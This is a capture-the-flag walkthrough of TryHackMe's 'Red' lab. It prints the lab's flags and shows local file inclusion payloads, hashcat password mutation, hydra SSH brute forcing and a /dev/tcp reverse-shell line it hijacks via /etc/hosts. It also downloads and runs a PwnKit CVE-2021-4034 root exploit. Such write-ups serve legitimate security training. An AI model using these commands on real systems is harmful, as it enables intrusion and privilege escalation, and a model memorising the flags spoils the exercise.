<p align="center">May 11, 2025<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{370}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>.<br><br>
<img width="300px" src="https://github.com/user-attachments/assets/df9c1849-2cbd-416e-b630-67cdd5603b7b" alt="Your Image Badge"><br>
<img width="200px" src="https://github.com/user-attachments/assets/62cf4572-71af-43ed-898e-31c0887632ce" alt="streak"></p>
<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Red}}$$</h1>
<p align="center"><em>A classic battle for the ages.</em>.<br>
It is classified as an easy-level CTF.<br>
You can join it for 🆓 using your own virtual machine with openVPN or TryHackMe´s AttackBox if you are subscribed.<br>
Can be accessed clicking  <a href="https://tryhackme.com/room/redisl33t"</a>.</p>

<p align="center"> <img width="1000px" src="https://github.com/user-attachments/assets/55a12fea-3dcc-40f2-b687-034e823b9541"> </p>


<br>
<br>

<h2>Task 1 . What are the flags:</h2>

<p>The match has started, and Red has taken the lead on you.<br>
But you are Blue, and only you can take Red down.<br><br>

However, Red has implemented some defense mechanisms that will make the battle a bit difficult:<br>
1. Red has been known to kick adversaries out of the machine. Is there a way around it?<br>
2. Red likes to change adversaries' passwords but tends to keep them relatively the same. <br>
3. Red likes to taunt adversaries in order to throw off their focus. Keep your mind sharp!<br><br>

This is a unique battle, and if you feel up to the challenge. Then by all means go for it!<br>

Whenever you are ready, click on the Start Machine button to fire up the Virtual Machine.</p>


<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 1.1. <em>What is the first flag?</em><a id='1.1'></a>
>> <code><strong>THM{Is_thAt_all_y0u_can_d0_blU3?}</strong></code><br>


<br>

> 1.2. <em>What is the second flag?</em><a id='1.2'></a>
>> <code><strong>THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S}</strong></code><br>

<br>

> 1.3. <em>What is the third flag?</em><a id='1.3'></a>
>> <code><strong>THM{Go0d_Gam3_Blu3_GG}</strong></code><br>

<br>

> 1.4. <em>If you liked this room, I recommend checking out TryHackMe's King of the Hill.</em><a id='1.4'></a>
>> <code><strong>No answer needed</strong></code><br>

<br>
<br>


<h3 align="center">$$\textcolor{white}{\textnormal{Nmap}}$$</h3>
<p align="center">There are have 2 ports open: <code>22/ssh/OpenSSH 8.2p1</code>.<br>
Identified <code>/index.php?page=home.html</code>.</p>

<br>

```bash
:~/Red# nmap -sC -sV -A -T4 red
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title: Atlanta - Free business bootstrap template
|_Requested resource was /index.php?page=home.html
...
```

<br>

<h3 align="center">$$\textcolor{white}{\textnormal{http://TargetIP?page=home.html}}$$</h3>

![image](https://github.com/user-attachments/assets/fd3fbbdc-cd40-436a-b215-f78017cd065b)

<br>

![image](https://github.com/user-attachments/assets/860e3b03-5324-4175-b681-d18516cdadfd)

<br>

![image](https://github.com/user-attachments/assets/5243409e-3bd8-4147-8a59-e4430a815182)

<br>


<p>
- <code>assets/js/html5shiv.js</code><br>
- <code>assets/js/respond.min.js</code><br>
- ...<br>
- <code>index.php?page=services.html</code><br>
- <code>assets/images/person_1.png</code><br>
- <code>assets/images/person_2.png</code><br>
- <code>assets/images/person_3.png</code><br>
- <code>http://webthemez.com/</code><br>
- <code>assets/js/modernizr-latest.js</code><br>
- <code>http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js</code><br>
- <code>http://netdna.bootstrapcdn.com/bootstrap/3.0.0/js/bootstrap.min.js</code><br>
- <code>assets/js/jquery.cslider.js</code><br>
- <code>assets/js/headroom.min.js</code><br>
- <code>assets/js/jQuery.headroom.min.js</code><br>
- <code>assets/js/custom.js</code></p>


<h3 align="center">$$\textcolor{white}{\textnormal{Testing for LFI}}$$</h3>

<br>

<p align="center">Tested <code>?page=../../../etc/passwd</code></p>

<br>

![image](https://github.com/user-attachments/assets/d42226cd-30c4-429e-a41c-7c01423c6b9c)


<br>

<p align="center">Tested <code>?page=....//....//....//etc/passwd</code></p>

<br>

![image](https://github.com/user-attachments/assets/04e4548f-a7a2-4b1d-a18c-a8f572c465bf)

<br>


<p align="center">Tested <code>?page=php://filter/resource=/etc/passwd</code><br>
Identified users <code>root</code>, <code>blue</code> and <code>red</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/7c2d432d-f145-4bb5-b3cc-5d45185527bf)

<br>

<br>

```bash
:~/Red# git clone https://github.com/hadrian3689/lfi_hunter
Cloning into 'lfi_hunter'...
...
:~/Red/lfi_hunter# python3 lfi_hunter.py -u 'http://webthmez.com/index.php?page=' -l 'php://filter/resource' -w unix.txt > report
:~/Red/lfi_hunter# cat report | more
...
****************************************************************************************************
File: /etc/hosts

127.0.0.1 localhost
127.0.1.1 red
192.168.0.1 redrules.thm
...
****************************************************************************************************
Searching for history files for user(s) blue
Found: History File for blue

echo "Red rules"
cd
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
cat passlist.txt
rm passlist.txt
sudo apt-get remove hashcat -y


****************************************************************************************************
Searching for history files for user(s) red
No history file found for user(s) red
****************************************************************************************************
Searching for SSH keys for user(s) blue
No SSH keys found for user(s) blue
****************************************************************************************************
Searching for SSH keys for user(s) red
No SSH keys found for user(s) red
****************************************************************************************************
...
```

<br>


<p align="center"><code>http://TargetIP/index.php?page==php://filter/resource=/home/blue/.reminder</code></p>

<br>

![image](https://github.com/user-attachments/assets/8e481537-6b3d-4fde-9166-963ced2da4f7)

<br>

<p align="center"><code>sup3r_p@s$w0rd!</code></p>

<br>

```bash
:~/Red/lfi_hunter# locate best64.rule
/opt/hashcat/rules/best64.rule
/opt/john/rules/best64.rule
/usr/local/share/doc/hashcat/rules/best64.rule
:~/Red/lfi_hunter# hashcat --stdout password -r /opt/hashcat/rules/best64.rule > passlist
:~/Red/lfi_hunter# cat passlist
sup3r_p@s$w0rd!
!dr0w$s@p_r3pus
SUP3R_P@S$W0RD!
Sup3r_p@s$w0rd!
sup3r_p@s$w0rd!0
sup3r_p@s$w0rd!1
sup3r_p@s$w0rd!2
sup3r_p@s$w0rd!3
sup3r_p@s$w0rd!4
sup3r_p@s$w0rd!5
sup3r_p@s$w0rd!6
sup3r_p@s$w0rd!7
sup3r_p@s$w0rd!8
sup3r_p@s$w0rd!9
sup3r_p@s$w0rd!00
sup3r_p@s$w0rd!01
sup3r_p@s$w0rd!02
sup3r_p@s$w0rd!11
sup3r_p@s$w0rd!12
sup3r_p@s$w0rd!13
sup3r_p@s$w0rd!21
sup3r_p@s$w0rd!22
sup3r_p@s$w0rd!23
sup3r_p@s$w0rd!69
sup3r_p@s$w0rd!77
sup3r_p@s$w0rd!88
sup3r_p@s$w0rd!99
sup3r_p@s$w0rd!123
sup3r_p@s$w0rd!e
sup3r_p@s$w0rd!s
sup3r_p@s$w0rda
sup3r_p@s$w0rs
sup3r_p@s$w0ra
sup3r_p@s$w0rer
sup3r_p@s$w0rie
sup3r_p@s$w0o
sup3r_p@s$w0y
sup3r_p@s$w0123
sup3r_p@s$w0man
sup3r_p@s$w0dog
1sup3r_p@s$w0rd!
thesup3r_p@s$w0rd!
dup3r_p@s$w0rd!
map3r_p@s$w0rd!
sup3r_p@s$w0rd!
sup3r_p@s$w0rd!
sup3r_p@s$w0rd!
su3r_p@s$w0rd!
sur_p@s$w0rd!
supr_p@s$w0rd!
sup3_p@s$w0rd!
supr
sup3r1
sup3r_p@s$w0rd
sup3r_p@s$w0r
sup3r_p@s$w0
sup3r_p@s$w0sup3r_p@s$w0
sp3r_p@s$w0
w0rd
s$w0rd!p3r_p@
sup3r_p@s$w0!
cup3r_p@s$w0r
rd!sup3r_p@s$w0
0rd!
w0rd!
$w0r$w0r
sup3
3rs3rs
{up3r_p@s$w0rd!
v3r_p@s$w0rd!
sup3p@
suprsupr
3rs
suw0suw0
swp@
sup3rp
s_p@s$
:~/Red/lfi_hunter# hydra -l blue -P passlist ssh://TargetIP
...
[DATA] attacking ssh://TargetIP:22/
[22][ssh] host: TargetIP   login: blue   password: sup3r_p@s$w0rd!9
...
:~/Red/lfi_hunter# 
```

<br>

sup3r_p@s$w0rd!9

```bash
~/Red/lfi_hunter# ssh blue@TargetIP
blue@TargetIP's password: 
...
blue@red:~$ I recommend you leave Blue or I will destroy your shell
...
blue@red:~$ pwd
/home/blue
blue@red:~$ ls
flag1
blue@red:~$ cat flag1
THM{Is_thAt_all_y0u_can_d0_blU3?}
blue@red:~$ Roses are Red and you suck Blue
blue@red:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...

root         368  0.0  0.3  43260 15904 ?        S<s  May11   0:00 /lib/systemd/systemd-journald
root         406  0.0  0.1  21516  5568 ?        Ss   May11   0:00 /lib/systemd/systemd-udevd
...
root         531  0.0  0.4 280140 17952 ?        SLsl May11   0:00 /sbin/multipathd -d -s
...
systemd+     581  0.0  0.1  90196  6048 ?        Ssl  May11   0:00 /lib/systemd/systemd-timesyncd
systemd+     598  0.0  0.1  26580  7548 ?        Ss   May11   0:00 /lib/systemd/systemd-networkd
systemd+     601  0.0  0.2  23732 11912 ?        Ss   May11   0:00 /lib/systemd/systemd-resolved
root         612  0.0  0.2 239280  9384 ?        Ssl  May11   0:00 /usr/lib/accountsservice/accounts-daemon
root         613  0.0  0.4 1307128 16692 ?       Ssl  May11   0:00 /usr/bin/amazon-ssm-agent
root         618  0.0  0.0   6816  2988 ?        Ss   May11   0:00 /usr/sbin/cron -f
message+     619  0.0  0.1   7516  4664 ?        Ss   May11   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root         639  0.0  0.0  81824  3732 ?        Ssl  May11   0:00 /usr/sbin/irqbalance --foreground
root         643  0.0  0.4  29668 18400 ?        Ss   May11   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
syslog       658  0.0  0.1 224344  5120 ?        Ssl  May11   0:00 /usr/sbin/rsyslogd -n -iNONE
root         659  0.0  1.0 875652 40712 ?        Ssl  May11   0:01 /usr/lib/snapd/snapd
root         666  0.0  0.1  16804  7628 ?        Ss   May11   0:00 /lib/systemd/systemd-logind
root         679  0.0  0.3 394760 13368 ?        Ssl  May11   0:00 /usr/lib/udisks2/udisksd
daemon       687  0.0  0.0   3796  2264 ?        Ss   May11   0:00 /usr/sbin/atd -f
root         707  0.0  0.1  12180  7476 ?        Ss   May11   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root         728  0.0  0.2 237980 10592 ?        Ssl  May11   0:00 /usr/lib/policykit-1/polkitd --no-debug
root         732  0.0  0.5 107916 20856 ?        Ssl  May11   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root         748  0.0  0.0   5600  2072 ttyS0    Ss+  May11   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root         753  0.0  0.0   5828  1872 tty1     Ss+  May11   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root         754  0.0  0.4 193616 18212 ?        Ss   May11   0:00 /usr/sbin/apache2 -k start
...
www-data   14593  0.0  0.3 194256 14276 ?        S    00:00   0:00 /usr/sbin/apache2 -k start
www-data   14594  0.0  0.3 194256 13312 ?        S    00:00   0:00 /usr/sbin/apache2 -k start
www-data   14596  0.0  0.3 194256 13044 ?        S    00:00   0:00 /usr/sbin/apache2 -k start
www-data   14597  0.0  0.2 193896  8172 ?        S    00:00   0:00 /usr/sbin/apache2 -k start
www-data   14598  0.0  0.3 194272 13468 ?        S    00:00   0:00 /usr/sbin/apache2 -k start
www-data   14607  0.0  0.3 193992 12900 ?        S    00:00   0:00 /usr/sbin/apache2 -k start
...
root       15176  0.0  0.2  13928  8988 ?        Ss   00:13   0:00 sshd: blue [priv]
blue       15193  0.0  0.2  18384  9596 ?        Ss   00:13   0:00 /lib/systemd/systemd --user
blue       15195  0.0  0.0 170792  3392 ?        S    00:13   0:00 (sd-pam)
blue       15276  0.0  0.1  14060  6004 ?        S    00:14   0:00 sshd: blue@pts/0
blue       15277  0.0  0.1   8276  5208 pts/0    Ss   00:14   0:00 -bash
red        15296  0.0  0.0   6972  2732 ?        S    00:14   0:00 bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
red        15328  0.0  0.0   6972  2552 ?        S    00:15   0:00 bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
root       15330  0.0  0.0      0     0 ?        I    00:15   0:00 [kworker/u30:2-events_power_efficient]
blue       15331  0.0  0.0   8888  3292 pts/0    R+   00:15   0:00 ps aux
blue@red:~$ Roses are Red, but violets aren\u2019t blue, They\u2019re purple, you dope. Now go get a clue.
blue@red:~$ Roses are Red, but violets aren\u2019t blue, They\u2019re purple, you dope. Now go get a clue.
Get out of my machine Blue!!
No you are repeating yourself, you are repeating yourself

blue@red:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 red
192.168.0.1 redrules.thm
...
```


<br>

sup3r_p@s$w0!

```bash
:~/Red/lfi_hunter# hydra -l blue -P passlist ssh://TargetIP
...
[DATA] attacking ssh://TargetIP:22/
[22][ssh] host: TargetIP   login: blue   password: sup3r_p@s$w0!
...
blue@red:~$ echo '10.10.200.19 redrules.thm' >> /etc/hosts
```


```bash
~/Red# nc -nlvp 9001
...

red@red:~$ id
uid=1001(red) gid=1001(red) groups=1001(red)
red@red:~$ pwd
pwd
/home/red
red@red:~$ ls
ls
flag2
red@red:~$ cat flag2
cat flag2
THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S}
red@red:~$ 
```

<br>



```bash

red@red:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
red@red:~$ ^Z
[1]+  Stopped                 nc -nlvp 9001
:~/Red# stty raw -echo; fg
nc -nlvp 9001

red@red:~$ find / -perm -u=s -type f 2>/dev/null
/home/red/.git/pkexec
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/bin/at
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/su
/snap/snapd/18933/usr/lib/snapd/snap-confine
/snap/snapd/18596/usr/lib/snapd/snap-confine
/snap/core20/1828/usr/bin/chfn
/snap/core20/1828/usr/bin/chsh
/snap/core20/1828/usr/bin/gpasswd
/snap/core20/1828/usr/bin/mount
/snap/core20/1828/usr/bin/newgrp
/snap/core20/1828/usr/bin/passwd
/snap/core20/1828/usr/bin/su
/snap/core20/1828/usr/bin/sudo
/snap/core20/1828/usr/bin/umount
/snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1828/usr/lib/openssh/ssh-keysign
/snap/core20/1852/usr/bin/chfn
/snap/core20/1852/usr/bin/chsh
/snap/core20/1852/usr/bin/gpasswd
/snap/core20/1852/usr/bin/mount
/snap/core20/1852/usr/bin/newgrp
/snap/core20/1852/usr/bin/passwd
/snap/core20/1852/usr/bin/su
/snap/core20/1852/usr/bin/sudo
/snap/core20/1852/usr/bin/umount
/snap/core20/1852/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1852/usr/lib/openssh/ssh-keysign
red@red:~$ 
```

<br>

![image](https://github.com/user-attachments/assets/707f7b2e-c6ab-4b4b-b414-6ac0934e6b73)

<br>


```bash
:~/Red# git clone https://github.com/joeammond/CVE-2021-4034
Cloning into 'CVE-2021-4034'...
remote: Enumerating objects: 17, done.
remote: Counting objects: 100% (17/17), done.
remote: Compressing objects: 100% (14/14), done.
remote: Total 17 (delta 5), reused 8 (delta 3), pack-reused 0 (from 0)
Unpacking objects: 100% (17/17), 8.23 KiB | 1.37 MiB/s, done.
:~/Red/CVE-2021-4034# ls
CVE-2021-4034.py  LICENSE  README.md
~/Red# ls
CVE-2021-4034  lfi_hunter
:~/Red# cd CVE-2021-4034
:~/Red/CVE-2021-4034# ls
CVE-2021-4034.py  LICENSE  README.md
:~/Red/CVE-2021-4034# mv CVE-2021-4034.py ex.py
:~/Red/CVE-2021-4034# ls
ex.py  LICENSE  README.md
:~/Red/CVE-2021-4034# nano ex.py

```

![image](https://github.com/user-attachments/assets/ca32558a-936a-4e64-a012-47ac4afcd5e4)

<br>

![image](https://github.com/user-attachments/assets/41232789-810c-4a9f-9231-e3988041ec21)

<br>

```bash
:~/Red/CVE-2021-4034# python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
```

<br>

```bash
ed@red:/tmp$ wget http://AttackIP:4444/ex.py
...
ex.py               100%[===================>]   3.19K  --.-KB/s    in 0s      
...
red@red:/tmp$ python3 ex.py  
[+] Creating shared library for exploit code.
[+] Calling execve()
# whoami
root
# pwd
/tmp
# ls /root
defense  flag3	snap
# cat /root/flag3
THM{Go0d_Gam3_Blu3_GG}
# 

```

<br>
<br>


<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Room Completed}}$$</h1>

<p align="center"> <img width="1000px" src="https://github.com/user-attachments/assets/713d8e1b-fa35-467d-baca-bfdc5cfbb86f"> </p>

<p align="center"> <img width="1000px" src="https://github.com/user-attachments/assets/5948c3e9-fe84-42ea-afdf-ac0ac9ac9eaa"> </p>


<br>
<br>

<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{My TryHackMe Journey}}$$</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |   Global     |   Brazil     |   Global    |   Brazil   |          | Completed |           |
| May 11, 2025      | 370      |    230ᵗʰ     |        5ᵗʰ   |   414ᵗʰ     |    7ᵗʰ     |  101,173 |       724 |   62      |

</div>


<p align="center"> Global All Time:  230ᵗʰ <br><br><img width="1000px" src="https://github.com/user-attachments/assets/8af7ed1d-934f-4dbb-b75d-34588a6b2c7d"> </p>

<p align="center"> Brazil All Time: 5ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/e5d84fea-9c4e-454a-a17c-5ea4ef6c5a01"> </p>

<p align="center"> Global monthly: 414ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/338b3d87-fb7e-4686-abd3-987274181d6b"> </p>

<p align="center"> Brazil monthly: 7ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/d5933870-21c9-4458-bc6d-b7773cb1469d"> </p>


<br>
<br>

<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Thanks for coming!!!}}$$</h1>

<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 

<br>

<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Thank you}}$$</h1>
<p align="center"><a href="https://tryhackme.com/p/tryhackme">tryhackme</a> and <a href="https://tryhackme.com/p/hadrian3689">hadrian3689</a> for investing your time and effort to develop this walkthrough so that I could sharpen my skills!</p>
